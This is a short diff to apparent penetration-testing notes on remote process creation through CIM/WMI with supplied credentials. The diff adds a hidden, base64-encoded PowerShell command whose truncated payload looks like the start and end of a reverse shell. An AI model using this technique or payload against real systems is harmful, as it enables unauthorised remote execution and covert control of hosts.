@@ -15,3 +15,5 @@ $session = New-Cimsession -ComputerName 10.0.0.3 -Credential $credential -Sessio
 $command = 'notepad';
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 ================
+# We can use the base64 payload:
+$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4A...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
